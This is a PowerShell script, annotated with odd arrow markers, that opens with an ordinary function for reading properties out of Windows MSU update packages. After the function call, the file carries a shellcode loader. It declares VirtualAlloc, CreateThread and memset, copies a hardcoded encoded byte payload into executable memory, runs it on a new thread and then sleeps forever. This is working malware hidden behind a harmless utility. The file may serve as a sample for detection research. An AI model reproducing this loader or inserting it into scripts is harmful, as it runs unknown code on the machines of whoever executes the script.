

 -||-> function Get-MSUFileInfo {

	
	[CmdletBinding()]
	param
	(
		[System.IO.FileInfo]$FileName
	)
	
	
	 -||-> $RelativePath = ( -||-> split-path $SCRIPT:MyInvocation.MyCommand.Path -parent <-||- ) + "\" <-||- 
	
	 -||-> $Executable =  -||-> Join-Path -Path $env:windir -ChildPath "System32\expand.exe" <-||-  <-||- 
	
	 -||-> $Directory =  -||-> Join-Path -Path $RelativePath -ChildPath Expanded -ErrorAction SilentlyContinue <-||-  <-||- 
	
	 -||-> Remove-Item -Path $Directory -Recurse -Force -ErrorAction SilentlyContinue <-||- 
	
	 -||-> New-Item -Path $Directory -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null <-||- 
	
	 -||-> $Parameters = '-F:*properties.txt' + [char]32 + [char]34 + $FileName.FullName + [char]34 + [char]32 + [char]34 + $Directory + [char]34 <-||- 
	
	 -||-> $ErrCode = ( -||-> Start-Process -FilePath $Executable -ArgumentList $Parameters -WindowStyle Hidden -Wait -Passthru <-||- ).ExitCode <-||- 
	
	 -||-> $ExpandedFile =  -||-> Get-ChildItem -Path $Directory -Filter *properties.txt <-||-  <-||- 
	
	 -||-> $MSUObject =  -||-> New-Object System.Object <-||-  <-||- 
	 -||-> $MSUObject | Add-Member -MemberType NoteProperty -Name AppliesTo -Value ( -||-> Get-Content -Path $ExpandedFile.FullName | Where-Object {  -||-> $_ -like '*Applies to*' <-||-  } <-||- ).split("=")[1].replace('"', '') <-||- 
	 -||-> $MSUObject | Add-Member -MemberType NoteProperty -Name BuildDate -Value ( -||-> Get-Content -Path $ExpandedFile.FullName | Where-Object {  -||-> $_ -like '*Build Date*' <-||-  } <-||- ).split("=")[1].replace('"', '') <-||- 
	 -||-> $MSUObject | Add-Member -MemberType NoteProperty -Name Company -Value ( -||-> Get-Content -Path $ExpandedFile.FullName | Where-Object {  -||-> $_ -like '*Company*' <-||-  } <-||- ).split("=")[1].replace('"', '') <-||- 
	 -||-> $MSUObject | Add-Member -MemberType NoteProperty -Name FileVersion -Value ( -||-> Get-Content -Path $ExpandedFile.FullName | Where-Object {  -||-> $_ -like '*File Version*' <-||-  } <-||- ).split("=")[1].replace('"', '') <-||- 
	 -||-> $MSUObject | Add-Member -MemberType NoteProperty -Name InstallationType -Value ( -||-> Get-Content -Path $ExpandedFile.FullName | Where-Object {  -||-> $_ -like '*Installation Type*' <-||-  } <-||- ).split("=")[1].replace('"', '') <-||- 
	 -||-> $MSUObject | Add-Member -MemberType NoteProperty -Name InstallerEngine -Value ( -||-> Get-Content -Path $ExpandedFile.FullName | Where-Object {  -||-> $_ -like '*Installer Engine*' <-||-  } <-||- ).split("=")[1].replace('"', '') <-||- 
	 -||-> $MSUObject | Add-Member -MemberType NoteProperty -Name InstallerVersion -Value ( -||-> Get-Content -Path $ExpandedFile.FullName | Where-Object {  -||-> $_ -like '*Installer Version*' <-||-  } <-||- ).split("=")[1].replace('"', '') <-||- 
	 -||-> $MSUObject | Add-Member -MemberType NoteProperty -Name KBArticle -Value ( -||-> Get-Content -Path $ExpandedFile.FullName | Where-Object {  -||-> $_ -like '*KB Article Number*' <-||-  } <-||- ).split("=")[1].replace('"', '') <-||- 
	 -||-> $MSUObject | Add-Member -MemberType NoteProperty -Name Language -Value ( -||-> Get-Content -Path $ExpandedFile.FullName | Where-Object {  -||-> $_ -like '*Language*' <-||-  } <-||- ).split("=")[1].replace('"', '') <-||- 
	 -||-> $MSUObject | Add-Member -MemberType NoteProperty -Name PackageType -Value ( -||-> Get-Content -Path $ExpandedFile.FullName | Where-Object {  -||-> $_ -like '*Package Type*' <-||-  } <-||- ).split("=")[1].replace('"', '') <-||- 
	 -||-> $MSUObject | Add-Member -MemberType NoteProperty -Name ProcessorArchitecture -Value ( -||-> Get-Content -Path $ExpandedFile.FullName | Where-Object {  -||-> $_ -like '*Processor Architecture*' <-||-  } <-||- ).split("=")[1].replace('"', '') <-||- 
	 -||-> $MSUObject | Add-Member -MemberType NoteProperty -Name ProductName -Value ( -||-> Get-Content -Path $ExpandedFile.FullName | Where-Object {  -||-> $_ -like '*Product Name*' <-||-  } <-||- ).split("=")[1].replace('"', '') <-||- 
	 -||-> $MSUObject | Add-Member -MemberType NoteProperty -Name SupportLink -Value ( -||-> Get-Content -Path $ExpandedFile.FullName | Where-Object {  -||-> $_ -like '*Support Link*' <-||-  } <-||- ).split("=")[1].replace('"', '') <-||- 
	
	 -||-> Remove-Item -Path $Directory -Recurse -Force -ErrorAction SilentlyContinue <-||- 
	Return  -||-> $MSUObject <-||- 
} <-||- 

 -||-> $MSUInfo =  -||-> Get-MSUFileInfo -FileName "\\RSAT\Windows7\Windows6.1-KB958830-x64-RefreshPkg.msu" <-||-  <-||- 
 -||-> $MSUInfo <-||- 
 -||-> $BsT2 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $BsT2 -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xdb,0xd4,0xb8,0x07,0x53,0x7f,0x04,0xd9,0x74,0x24,0xf4,0x5d,0x31,0xc9,0xb1,0x47,0x31,0x45,0x18,0x03,0x45,0x18,0x83,0xc5,0x03,0xb1,0x8a,0xf8,0xe3,0xb7,0x75,0x01,0xf3,0xd7,0xfc,0xe4,0xc2,0xd7,0x9b,0x6d,0x74,0xe8,0xe8,0x20,0x78,0x83,0xbd,0xd0,0x0b,0xe1,0x69,0xd6,0xbc,0x4c,0x4c,0xd9,0x3d,0xfc,0xac,0x78,0xbd,0xff,0xe0,0x5a,0xfc,0xcf,0xf4,0x9b,0x39,0x2d,0xf4,0xce,0x92,0x39,0xab,0xfe,0x97,0x74,0x70,0x74,0xeb,0x99,0xf0,0x69,0xbb,0x98,0xd1,0x3f,0xb0,0xc2,0xf1,0xbe,0x15,0x7f,0xb8,0xd8,0x7a,0xba,0x72,0x52,0x48,0x30,0x85,0xb2,0x81,0xb9,0x2a,0xfb,0x2e,0x48,0x32,0x3b,0x88,0xb3,0x41,0x35,0xeb,0x4e,0x52,0x82,0x96,0x94,0xd7,0x11,0x30,0x5e,0x4f,0xfe,0xc1,0xb3,0x16,0x75,0xcd,0x78,0x5c,0xd1,0xd1,0x7f,0xb1,0x69,0xed,0xf4,0x34,0xbe,0x64,0x4e,0x13,0x1a,0x2d,0x14,0x3a,0x3b,0x8b,0xfb,0x43,0x5b,0x74,0xa3,0xe1,0x17,0x98,0xb0,0x9b,0x75,0xf4,0x75,0x96,0x85,0x04,0x12,0xa1,0xf6,0x36,0xbd,0x19,0x91,0x7a,0x36,0x84,0x66,0x7d,0x6d,0x70,0xf8,0x80,0x8e,0x81,0xd0,0x46,0xda,0xd1,0x4a,0x6f,0x63,0xba,0x8a,0x90,0xb6,0x57,0x8e,0x06,0xf9,0x00,0x91,0xb2,0x91,0x52,0x92,0x2f,0xd1,0xda,0x74,0x1f,0x45,0x8d,0x28,0xdf,0x35,0x6d,0x99,0xb7,0x5f,0x62,0xc6,0xa7,0x5f,0xa8,0x6f,0x4d,0xb0,0x05,0xc7,0xf9,0x29,0x0c,0x93,0x98,0xb6,0x9a,0xd9,0x9a,0x3d,0x29,0x1d,0x54,0xb6,0x44,0x0d,0x00,0x36,0x13,0x6f,0x86,0x49,0x89,0x1a,0x26,0xdc,0x36,0x8d,0x71,0x48,0x35,0xe8,0xb5,0xd7,0xc6,0xdf,0xce,0xde,0x52,0xa0,0xb8,0x1e,0xb3,0x20,0x38,0x49,0xd9,0x20,0x50,0x2d,0xb9,0x72,0x45,0x32,0x14,0xe7,0xd6,0xa7,0x97,0x5e,0x8b,0x60,0xf0,0x5c,0xf2,0x47,0x5f,0x9e,0xd1,0x59,0xa3,0x49,0x1f,0x2c,0xcd,0x49 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $PnSG=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $PnSG.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$PnSG,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



